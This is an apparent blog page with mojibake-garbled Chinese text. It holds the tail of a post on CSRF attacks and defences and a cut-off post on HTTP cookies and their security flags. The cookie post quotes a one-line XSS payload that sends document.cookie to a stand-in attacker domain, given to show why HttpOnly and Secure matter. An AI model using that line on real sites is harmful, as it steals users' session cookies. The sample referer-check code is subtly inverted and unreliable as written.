<p><strong>æ€»ç»“ï¼šCSRFæ˜¯é€šè¿‡å†’å……ç”¨æˆ·æ¥è¾¾åˆ°æ”»å‡»ç›®çš„çš„æ–¹å¼</strong></p>
<h2 id="CSRFåŸç†"><a href="#CSRFåŸç†" class="headerlink" title="CSRFåŸç†"></a>CSRFåŸç†</h2><p>CSRFå¯ä»¥é€šè¿‡è¯·æ±‚ï¼Œæºå¸¦ç”¨æˆ·ç™»å½•æ€ï¼Œä¼ªé€ è¯·æ±‚ã€‚åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå¯åˆ©ç”¨ç”¨æˆ·èº«ä»½å®Œæˆä¸šåŠ¡è¯·æ±‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   www.a.comåç«¯</span><br><span class="line">	  ||\       |\</span><br><span class="line">   1||2          \  3</span><br><span class="line">   \||             \</span><br><span class="line">www.a.comå‰ç«¯         www.b.com</span><br><span class="line"></span><br><span class="line">1ã€ç”¨æˆ·ç™»é™†Aç½‘ç«™</span><br><span class="line">2ã€Aç½‘ç«™ç¡®è®¤èº«ä»½</span><br><span class="line">3ã€Bç½‘ç«™é¡µé¢å‘Aç½‘ç«™å‘èµ·è¯·æ±‚ï¼ˆå¸¦Aç½‘ç«™èº«ä»½ï¼‰</span><br></pre></td></tr></table></figure>
<h2 id="CSRFåˆ†æåŠé˜²å¾¡"><a href="#CSRFåˆ†æåŠé˜²å¾¡" class="headerlink" title="CSRFåˆ†æåŠé˜²å¾¡"></a>CSRFåˆ†æåŠé˜²å¾¡</h2><h3 id="CSRFåŸç†åˆ†æ"><a href="#CSRFåŸç†åˆ†æ" class="headerlink" title="CSRFåŸç†åˆ†æ"></a>CSRFåŸç†åˆ†æ</h3><p>Bç½‘ç«™å‘Aç½‘ç«™å‘èµ·æ”»å‡»åŸç†ï¼š</p>
<ul>
<li>Bç½‘ç«™å‘Aç½‘ç«™è¯·æ±‚</li>
<li>æºå¸¦Aç½‘ç«™Cookie</li>
<li>ä¸è®¿é—®Aç½‘ç«™å‰ç«¯</li>
<li>è¯·æ±‚çš„refererä¸ºBç½‘ç«™</li>
</ul>
<h3 id="CSRFé˜²å¾¡"><a href="#CSRFé˜²å¾¡" class="headerlink" title="CSRFé˜²å¾¡"></a>CSRFé˜²å¾¡</h3><p>CSRFçš„æ ¸å¿ƒåŸç†å³ï¼š1ã€ä¸ç›´æ¥è®¿é—®Aç½‘ç«™å‰ç«¯ï¼Œè€Œæ˜¯é€šè¿‡Bè®¿é—®Aï¼Œåˆ™å¯ä»¥é€šè¿‡<strong>ç¦æ­¢ä½¿ç”¨ç¬¬ä¸‰æ–¹å¸¦æ¥cookiesï¼Œå¢åŠ éªŒè¯ç ã€tokenæœºåˆ¶</strong>ã€‚2ã€Bç½‘ç«™è®¿é—®Aç½‘ç«™ï¼Œæ•…æ‰€æºå¸¦çš„refererä¸ºBç½‘ç«™ã€‚åˆ™å¯ä»¥é€šè¿‡<strong>éªŒè¯refererï¼Œç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹è¯·æ±‚</strong></p>
<h4 id="ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™å¸¦æ¥cookies"><a href="#ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™å¸¦æ¥cookies" class="headerlink" title="ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™å¸¦æ¥cookies"></a>ç¦æ­¢ç¬¬ä¸‰æ–¹ç½‘ç«™å¸¦æ¥cookies</h4><p>é€šè¿‡Cookieçš„SameSiteç¦æ­¢ç¬¬ä¸‰æ–¹è®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: key=value; path=/; SameSite</span><br></pre></td></tr></table></figure>
<p>ç”±äºSameSiteå…¼å®¹é—®é¢˜ï¼Œå¯¹äºå¤§éƒ¨åˆ†ç‰ˆæœ¬ä½çš„æµè§ˆå™¨å’Œéƒ¨åˆ†æµè§ˆå™¨ä¸äºˆæ”¯æŒã€‚åœ¨ä½¿ç”¨ä¸­éœ€è€ƒè™‘æ˜¯å¦ç”±äºä½ç‰ˆæœ¬é—®é¢˜è€Œä¸ç”Ÿæ•ˆï¼Œä½†SameSiteä¸ä¼šå› ç‰ˆæœ¬è¿‡ä½è€ŒæŠ¥é”™ï¼Œå› æ­¤å¯æ”¾å¿ƒä½¿ç”¨</p>
<p>è¯¦ç»†<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility" target="_blank" rel="noopener">Cookie</a>å¯ç‚¹å‡»æŸ¥çœ‹</p>
<h4 id="å¢åŠ éªŒè¯ç ï¼Œtoken"><a href="#å¢åŠ éªŒè¯ç ï¼Œtoken" class="headerlink" title="å¢åŠ éªŒè¯ç ï¼Œtoken"></a>å¢åŠ éªŒè¯ç ï¼Œtoken</h4><p>ç”±äºç”Ÿæ•ˆæœºåˆ¶æ˜¯Bç½‘ç«™è®¿é—®Aç½‘ç«™æºå¸¦Cookieå³è·å¾—ä¿¡ä»»ï¼Œåˆ™å¯ä»¥é€šè¿‡å¢åŠ å¿…é¡»æ“ä½œæ—¶å¸¦å…¥éªŒè¯ç åŠæœ¬åœ°tokenæºå¸¦</p>
<h4 id="éªŒè¯refererï¼Œç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹çš„è¯·æ±‚"><a href="#éªŒè¯refererï¼Œç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹çš„è¯·æ±‚" class="headerlink" title="éªŒè¯refererï¼Œç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹çš„è¯·æ±‚"></a>éªŒè¯refererï¼Œç¦æ­¢æ¥è‡ªç¬¬ä¸‰æ–¹çš„è¯·æ±‚</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// koa</span><br><span class="line">let referer = ctx.request.headers.referer</span><br><span class="line">if (/^https?:\/\/example.com/.test(referer)) &#123;</span><br><span class="line">  // error</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰æ–¹è®¿é—®çš„refereræ˜¯ç¬¬ä¸‰æ–¹é¡µé¢è¯·æ±‚çš„refererï¼Œè€Œéæœ¬èº«æœåŠ¡å™¨è¯·æ±‚çš„referer</p>
<p>åœ¨åˆ¤æ–­ç¬¬ä¸‰æ–¹è¯·æ±‚æ—¶ï¼Œå¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼</p>
<h2 id="CSRFæ”»å‡»é˜²å¾¡æ€»ç»“"><a href="#CSRFæ”»å‡»é˜²å¾¡æ€»ç»“" class="headerlink" title="CSRFæ”»å‡»é˜²å¾¡æ€»ç»“"></a>CSRFæ”»å‡»é˜²å¾¡æ€»ç»“</h2><ul>
<li>CSRFæ”»å‡»ä¸»è¦æ˜¯æ¶æ„ç½‘ç«™è®¿é—®å·²ç»å…·æœ‰ç™»å½•æ€çš„ç½‘ç«™</li>
<li>é€šè¿‡æºå¸¦Aç½‘ç«™çš„Cookieï¼Œä»¥ç”¨æˆ·èº«ä»½è¿›è¡Œä¸šåŠ¡æ“ä½œ</li>
<li>æ”»å‡»åŸç†çš„æ ¸å¿ƒè¦ç‚¹æ˜¯ä¸ç›´æ¥è®¿é—®ç™»å½•æ€ç½‘ç«™åŠrefererä¸ºæ”»å‡»è€…ç½‘ç«™</li>
<li>é˜²å¾¡æ ¸å¿ƒåŸç†æ˜¯ç¦æ­¢ç¬¬ä¸‰æ–¹æºå¸¦Cookieè¿›è¡Œè¯·æ±‚ã€å¢åŠ éªŒè¯ç ã€tokenæœºåˆ¶ã€éªŒè¯refereråŠç¦æ­¢ç¬¬ä¸‰æ–¹è¯·æ±‚</li>
</ul>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>XSSå’ŒCSRFæ˜¯å¸¸è§çš„Webæ”»é˜²ï¼Œæ”»å‡»è€…é€šè¿‡æ³¨å…¥æˆ–ä¼ªè£…è¿›è¡Œæ”»å‡»ã€‚XSSé˜²å¾¡å¯é€šè¿‡es6æ¨¡ç‰ˆå­—ç¬¦ä¸²è§£å†³å¤§éƒ¨åˆ†æ³¨å…¥é—®é¢˜ï¼›CSRFåˆ™ä¸ä½¿ç”¨ç®€å•Cookieä½œä¸ºç™»å½•æ€å”¯ä¸€å‡­è¯ï¼Œç¦æ­¢ç¬¬ä¸‰æ–¹è¯·æ±‚æœç»ç»å¤§éƒ¨åˆ†é—®é¢˜ã€‚</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/HTTP/basic-cookies/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/HTTP/basic-cookies/" itemprop="url">ç®¡ä¸­çª¥è±¹çœ‹Cookie</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-04-09T21:14:04+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>æœ¬æ–‡ä¸»è¦ä»‹ç»äº†ä»€ä¹ˆæ˜¯cookieã€cookieçš„ç‰¹æ€§ã€cookieçš„ä½œç”¨åŠç”¨é€”ã€cookieçš„å®‰å…¨ç­–ç•¥ã€‚ä¸æ¶‰åŠCookieçš„<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">è¯¦ç»†å‚æ•°</a>ã€‚</p>
<h2 id="Cookieä»‹ç»"><a href="#Cookieä»‹ç»" class="headerlink" title="Cookieä»‹ç»"></a>Cookieä»‹ç»</h2><p>ä»¥ä¸‹Wikipediaã€MDNå¯¹cookieçš„ä»‹ç»</p>
<blockquote>
<p><strong>Wikipedia:</strong></p>
<p>Cookieï¼ˆå¤æ•°å½¢æ€Cookiesï¼‰ï¼Œåˆç§°ä¸ºâ€œå°ç”œé¥¼â€ã€‚ç±»å‹ä¸ºâ€œ<strong>å°å‹æ–‡æœ¬æ–‡ä»¶</strong>â€ï¼ŒæŒ‡æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½è€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ï¼ˆClient Sideï¼‰ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ã€‚ç”±ç½‘æ™¯å…¬å¸çš„å‰é›‡å‘˜å¢Â·è’™ç‰¹åˆ©åœ¨1993å¹´3æœˆå‘æ˜ã€‚æœ€åˆå®šä¹‰äºRFC 2109ã€‚å½“å‰ä½¿ç”¨æœ€å¹¿æ³›çš„ Cookieæ ‡å‡†å´ä¸æ˜¯RFCä¸­å®šä¹‰çš„ä»»ä½•ä¸€ä¸ªï¼Œè€Œæ˜¯åœ¨ç½‘æ™¯å…¬å¸åˆ¶å®šçš„æ ‡å‡†ä¸Šè¿›è¡Œæ‰©å±•åçš„äº§ç‰©ã€‚</p>
<p><strong>MDN:</strong></p>
<p>HTTP Cookieï¼ˆä¹Ÿå«Web Cookieæˆ–æµè§ˆå™¨Cookieï¼‰æ˜¯æœåŠ¡å™¨å‘é€åˆ°ç”¨æˆ·æµè§ˆå™¨å¹¶ä¿å­˜åœ¨æœ¬åœ°çš„ä¸€å°å—æ•°æ®ï¼Œå®ƒä¼šåœ¨æµè§ˆå™¨ä¸‹æ¬¡å‘åŒä¸€æœåŠ¡å™¨å†å‘èµ·è¯·æ±‚æ—¶è¢«æºå¸¦å¹¶å‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚é€šå¸¸ï¼Œå®ƒç”¨äºå‘ŠçŸ¥æœåŠ¡ç«¯ä¸¤ä¸ªè¯·æ±‚æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ï¼Œå¦‚ä¿æŒç”¨æˆ·çš„ç™»å½•çŠ¶æ€ã€‚Cookieä½¿åŸºäºæ— çŠ¶æ€çš„HTTPåè®®è®°å½•ç¨³å®šçš„çŠ¶æ€ä¿¡æ¯æˆä¸ºäº†å¯èƒ½ã€‚</p>
</blockquote>
<p><strong>åˆ’é‡ç‚¹ï¼šå°å‹æ–‡æœ¬æ–‡ä»¶ã€è¾¨åˆ«ç”¨æˆ·èº«ä»½å­˜å‚¨åœ¨ç”¨æˆ·æœ¬åœ°ã€åˆ¤æ–­æ˜¯å¦æ¥è‡ªåŒä¸€æµè§ˆå™¨ã€ä¿æŒç™»å½•æ€</strong></p>
<p>Cookieçš„æœ€åˆæƒ³æ³•æ˜¯å½“ä½œå°å‹æ–‡æœ¬æ–‡ä»¶ï¼Œåœ¨HTTPè¯·æ±‚ä¸­ä½œä¸ºç”¨æˆ·æ•°æ®ä½œä¸ºä¿¡æ¯ä¼ é€’ã€‚æœ€å¸¸è§„çš„ç”¨æ³•æ˜¯æœåŠ¡å™¨ç»™å®¢æˆ·ç«¯ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ï¼Œå®¢æˆ·ç«¯åœ¨ä¸æœåŠ¡å™¨äº’åŠ¨æ—¶å°†æ ‡è¯†å›ä¼ ç»™æœåŠ¡å™¨ï¼Œå®¢æˆ·ç«¯å³å¯åˆ¤æ–­ç”¨æˆ·ç™»å½•æ€ã€‚</p>
<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./exchange-cookies.png" alt="cookiesæ¶ˆæ¯ä¼ é€’">Cookiesçš„ä¼ è¾“</div>

<p><strong>æ³¨æ„</strong>ï¼š<em>Cookieæ›¾ä¸€åº¦ç”¨äºå®¢æˆ·ç«¯æ•°æ®çš„å­˜å‚¨ï¼Œå› å½“æ—¶å¹¶æ²¡æœ‰å…¶å®ƒåˆé€‚çš„å­˜å‚¨åŠæ³•è€Œä½œä¸ºå”¯ä¸€çš„å­˜å‚¨æ‰‹æ®µï¼Œä½†ç°åœ¨éšç€ç°ä»£æµè§ˆå™¨å¼€å§‹æ”¯æŒå„ç§å„æ ·çš„å­˜å‚¨æ–¹å¼ï¼Œcookieæ¸æ¸è¢«æ·˜æ±°ã€‚</em></p>
<h2 id="Cookieçš„ç‰¹æ€§"><a href="#Cookieçš„ç‰¹æ€§" class="headerlink" title="Cookieçš„ç‰¹æ€§"></a>Cookieçš„ç‰¹æ€§</h2><h3 id="å‰ç«¯æ•°æ®å­˜å‚¨åŠè¯»å†™"><a href="#å‰ç«¯æ•°æ®å­˜å‚¨åŠè¯»å†™" class="headerlink" title="å‰ç«¯æ•°æ®å­˜å‚¨åŠè¯»å†™"></a>å‰ç«¯æ•°æ®å­˜å‚¨åŠè¯»å†™</h3><p>Cookieå¯ç”±å‰ç«¯è¿›è¡Œæ“ä½œï¼Œå¯å°†æ•°æ®æš‚å­˜è‡³cookieä¸­ã€‚JavaScriptæ“ä½œcookie<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie" target="_blank" rel="noopener">document.cookie</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.cookie=newCookie å‘Cookieä¸­æ·»åŠ æ–°çš„Cookie Cookieä¸ºkey=valueå½¢å¼</span></span><br><span class="line"><span class="comment">// å¯è®¾ç½®pathï¼Œdomainï¼Œmax-ageï¼Œexpiresï¼Œsecure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¢åŠ cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// åˆ é™¤cookie é€šè¿‡è®¾ç½®è¿‡å»çš„æ—¶é—´åˆ é™¤cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=true; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() - <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// ä¿®æ”¹cookie</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">`someCookieName=false; expires=<span class="subst">$&#123;<span class="keyword">new</span> <span class="built_in">Date</span>().toGMTString() + <span class="number">1</span>&#125;</span>; path=/`</span></span><br><span class="line"><span class="comment">// æŸ¥æ‰¾cookie</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(?:^|;\\s*)"</span> + <span class="built_in">encodeURIComponent</span>(<span class="string">"éœ€è¦æŸ¥æ‰¾çš„cookie"</span>).replace(<span class="regexp">/[-.+*]/g</span>, <span class="string">"\\$&amp;"</span>) + <span class="string">"\\s*\\="</span>)).test(<span class="built_in">document</span>.cookie)</span><br></pre></td></tr></table></figure></p>
<h3 id="åç«¯é€šè¿‡httpå¤´è®¾ç½®"><a href="#åç«¯é€šè¿‡httpå¤´è®¾ç½®" class="headerlink" title="åç«¯é€šè¿‡httpå¤´è®¾ç½®"></a>åç«¯é€šè¿‡httpå¤´è®¾ç½®</h3><p>åç«¯å¯ä»¥é€šè¿‡è®¾ç½®cookieæ¥è®¾ç½®ä¼ é€’çš„cookieã€‚Nodejsæ“ä½œcookie, Koaè®¾ç½®cookie<a href="https://github.com/pillarjs/cookies" target="_blank" rel="noopener">å‚æ•°</a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä»¥nodejsä¸ºä¾‹</span></span><br><span class="line"><span class="comment">// è·å–</span></span><br><span class="line">response.getHeader(<span class="string">"Cookie"</span>);</span><br><span class="line"><span class="comment">// è®¾ç½®</span></span><br><span class="line">response.setHeader(<span class="string">"Cookie"</span>, [<span class="string">"name=gdccwxx"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»¥koaä¸ºä¾‹</span></span><br><span class="line"><span class="comment">// è·å–</span></span><br><span class="line">ctx.cookies.get(name, [options])</span><br><span class="line"><span class="comment">// è®¾ç½®</span></span><br><span class="line">ctx.cookies.set(name, value, [options])</span><br></pre></td></tr></table></figure></p>
<h3 id="è¯·æ±‚æ—¶é€šè¿‡httpå¤´ä¼ ç»™åç«¯"><a href="#è¯·æ±‚æ—¶é€šè¿‡httpå¤´ä¼ ç»™åç«¯" class="headerlink" title="è¯·æ±‚æ—¶é€šè¿‡httpå¤´ä¼ ç»™åç«¯"></a>è¯·æ±‚æ—¶é€šè¿‡httpå¤´ä¼ ç»™åç«¯</h3><p>ä»¥Googleé”®å…¥è¯·æ±‚ä¸ºä¾‹</p>
<div style="width: 80%; margin: 0 auto;text-align:center"><img src="/HTTP/basic-cookies/./font-transfer-cookie.png" alt="è¯·æ±‚Google">è¯·æ±‚é€šè¿‡httpå¤´ä¼ é€ç»™åç«¯</div>

<h3 id="éµå®ˆåŒæºç­–ç•¥"><a href="#éµå®ˆåŒæºç­–ç•¥" class="headerlink" title="éµå®ˆåŒæºç­–ç•¥"></a>éµå®ˆåŒæºç­–ç•¥</h3><p>Domain å’Œ Path æ ‡è¯†å®šä¹‰äº†cookieçš„ä½œç”¨åŸŸï¼šå³cookieåº”è¯¥å‘é€ç»™å“ªäº›URLã€‚<br>Domain æ ‡è¯†æŒ‡å®šäº†å“ªäº›ä¸»æœºå¯ä»¥æ¥å—cookieã€‚å¦‚æœä¸æŒ‡å®šï¼Œé»˜è®¤ä¸ºå½“å‰æ–‡æ¡£çš„ä¸»æœºï¼ˆ<strong>ä¸åŒ…å«å­åŸŸå</strong>ï¼‰ã€‚å¦‚æœæŒ‡å®šäº†Domainï¼Œåˆ™ä¸€èˆ¬åŒ…å«å­åŸŸåã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¾ç½® Domain=mozilla.orgï¼Œåˆ™Cookieä¹ŸåŒ…å«åœ¨å­åŸŸåä¸­ï¼ˆå¦‚developer.mozilla.orgï¼‰ã€‚</p>
<h2 id="Cookieä½œç”¨åŠç”¨é€”"><a href="#Cookieä½œç”¨åŠç”¨é€”" class="headerlink" title="Cookieä½œç”¨åŠç”¨é€”"></a>Cookieä½œç”¨åŠç”¨é€”</h2><h3 id="Cookieçš„ä½œç”¨"><a href="#Cookieçš„ä½œç”¨" class="headerlink" title="Cookieçš„ä½œç”¨"></a>Cookieçš„ä½œç”¨</h3><p><strong>å­˜å‚¨ä¸ªæ€§åŒ–è®¾ç½®</strong><br>å³ä½¿åœ¨ç›¸åŒçš„Domainä¸‹ï¼Œä¸åŒçš„urlå¯ä»¥å­˜å‚¨ä¸åŒåŒºå—ä¸‹çš„cookieï¼Œå³åˆ°è¾¾ç‰¹å®šé¡µé¢ä¸‹å¯æœ‰é¡µé¢è‡ªå·±çš„cookieã€‚</p>
<div style="width: 80%; margin: 0 auto; text-align: center"><br>    <img src="/HTTP/basic-cookies/./out-path-cookie.png" alt="åœ¨ä¸»é¡µçš„cookie"><br><br><br>  åœ¨google.comçš„cookie<br><br><br>  <img src="/HTTP/basic-cookies/./in-path-cookie.png" alt="åœ¨æœç´¢çš„cookie"><br><br><br>  åœ¨google.com/searchçš„cookie<br><br><br></div>

<p>æ­£å› ä¸ºcookieçš„ä½œç”¨åŸŸï¼Œä½¿å¾—cookieå­˜å‚¨æœ‰ç€å¤šæ ·æ€§ã€‚</p>
<p><strong>å­˜å‚¨æœªç™»é™†æ—¶ç”¨æˆ·å”¯ä¸€æ ‡è¯†</strong></p>
<p>åœ¨å¯å…è®¸æœªç™»é™†çš„ç½‘ç«™ï¼Œä¾‹å¦‚æ–°æµªå¾®åšã€‚æ¸¸å®¢æ€ä¸‹æ‰€åšçš„äº‹æƒ…å¯ä¸ç”¨æˆ·æ€ä¸‹å¯è¿›è¡Œå…³è”ã€‚<br>å…·ä½“æ“ä½œï¼š<br>1ã€å‘æœªç™»é™†çš„ç”¨æˆ·å‘é€ä¸€ä¸ªå”¯ä¸€çš„æ ‡è¯†ã€‚<br>2ã€ä¿ç•™å”¯ä¸€æ ‡è¯†æ‰€åšçš„äº‹æƒ…ã€‚<br>3ã€ç”¨æˆ·ç™»å½•åå…³è”è´¦æˆ·åŠå”¯ä¸€æ ‡è¯†æ‰€åšçš„äº‹æƒ…ã€‚</p>
<p>ä»¥æ–°æµªå¾®åšä¸ºä¾‹ï¼š</p>
<div style="width: 80%; margin: 0 auto; text-align: center"><br><img src="/HTTP/basic-cookies/./unlogin-cookie.png" alt="æœªç™»é™†çŠ¶æ€ä¸‹çš„cookie"><br><br><br>æœªç™»å½•çŠ¶æ€ä¸‹çš„cookieï¼šlogin_sid_tè¡¨ç¤ºå”¯ä¸€æ ‡è¯†<br></div>

<p>é€šè¿‡å”¯ä¸€æ ‡è¯†ä¸ç™»å½•æ€çš„ç»‘å®šï¼Œå¯å»ºç«‹æ¸¸å®¢æ€ä¸ç”¨æˆ·æ€çš„å…³è”</p>
<p><strong>å­˜å‚¨å·²ç»ç™»é™†ç”¨æˆ·çš„å‡­è¯</strong><br>cookieä¸­å­˜å‚¨ç”¨æˆ·çš„å”¯ä¸€æ ‡è¯†åŠç®€å•tokenã€‚ç®€å•tokenæ˜¯é€šè¿‡æŸç§å½¢å¼ä¸ç”¨æˆ·å”¯ä¸€æ ‡è¯†çš„åŠ å¯†åå¾—å‡ºçš„ç»“æœã€‚åç«¯å–åˆ°tokenåŠç”¨æˆ·å”¯ä¸€æ ‡è¯†ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥tokenåˆ¤æ–­åˆæ³•æ€§åŠæ˜¯å¦ç™»é™†è¿‡æœŸåˆ¤æ–­ç”¨æˆ·æ˜¯å¦ä¸ºç™»å½•æ€ã€‚</p>
<p><strong>å­˜å‚¨å…¶ä»–ä¸šåŠ¡æ•°æ®</strong><br>å¯å­˜å‚¨å…¶ä»–ä¸šåŠ¡ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·ç”Ÿæ—¥ç­‰</p>
<h3 id="Cookieçš„ç”¨é€”"><a href="#Cookieçš„ç”¨é€”" class="headerlink" title="Cookieçš„ç”¨é€”"></a>Cookieçš„ç”¨é€”</h3><p>äº†è§£Cookieçš„ä½œç”¨åï¼Œå…¶ä¸»è¦ç”¨é€”æ˜¯ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢ï¼š</p>
<ul>
<li>ä¼šè¯çŠ¶æ€ç®¡ç†ï¼ˆå¦‚ç”¨æˆ·ç™»å½•çŠ¶æ€ã€è´­ç‰©è½¦ã€æ¸¸æˆåˆ†æ•°æˆ–å…¶å®ƒéœ€è¦è®°å½•çš„ä¿¡æ¯ï¼‰</li>
<li>ä¸ªæ€§åŒ–è®¾ç½®ï¼ˆå¦‚ç”¨æˆ·è‡ªå®šä¹‰è®¾ç½®ã€ä¸»é¢˜ç­‰ï¼‰</li>
<li>æµè§ˆå™¨è¡Œä¸ºè·Ÿè¸ªï¼ˆå¦‚è·Ÿè¸ªåˆ†æç”¨æˆ·è¡Œä¸ºç­‰ï¼‰</li>
</ul>
<h2 id="Cookie-çš„å®‰å…¨ç­–ç•¥"><a href="#Cookie-çš„å®‰å…¨ç­–ç•¥" class="headerlink" title="Cookie çš„å®‰å…¨ç­–ç•¥"></a>Cookie çš„å®‰å…¨ç­–ç•¥</h2><h3 id="Cookieä¸XSSçš„å…³ç³»"><a href="#Cookieä¸XSSçš„å…³ç³»" class="headerlink" title="Cookieä¸XSSçš„å…³ç³»"></a>Cookieä¸XSSçš„å…³ç³»</h3><p>åœ¨httpä¼šè¯åŠ«æŒæƒ…å†µä¸‹ï¼Œcookieä¸xssçš„å…³ç³»å°±æ˜¾å¾—ååˆ†äº²å¯†äº†ã€‚çœ‹ä¸€æ®µä»£ç <br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure></p>
<p>è¿™ç§æƒ…å†µä¸‹çš„cookieåˆ™ä¼šå‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ã€‚</p>
<h4 id="åˆ†æXSSæ”»å‡»ï¼š"><a href="#åˆ†æXSSæ”»å‡»ï¼š" class="headerlink" title="åˆ†æXSSæ”»å‡»ï¼š"></a>åˆ†æXSSæ”»å‡»ï¼š</h4><ul>
<li>ä¼šè¯è¢«åŠ«æŒ</li>
<li>é€šè¿‡documentè·å–cookie</li>
</ul>
<h4 id="è§£å†³åŠæ³•ï¼š"><a href="#è§£å†³åŠæ³•ï¼š" class="headerlink" title="è§£å†³åŠæ³•ï¼š"></a>è§£å†³åŠæ³•ï¼š</h4><ul>
<li>ä¼šè¯åŠ«æŒï¼šä½¿ç”¨cookieä¸­Secureæ ‡è¯†</li>
<li>ä¸è¢«JavaScriptè°ƒç”¨cookieï¼šä½¿ç”¨cookieä¸­HttpOnlyæ ‡è¯†</li>
</ul>
<h4 id="å‚æ•°ä»‹ç»"><a href="#å‚æ•°ä»‹ç»" class="headerlink" title="å‚æ•°ä»‹ç»"></a>å‚æ•°ä»‹ç»</h4><p><strong>Secureï¼ˆç›®å‰Chromeã€Firefoxåœ¨52+ç‰ˆæœ¬ä¸å…è®¸éå®‰å…¨çš„HTTPè®¾ç½®Cookieï¼‰</strong></p>
<blockquote>
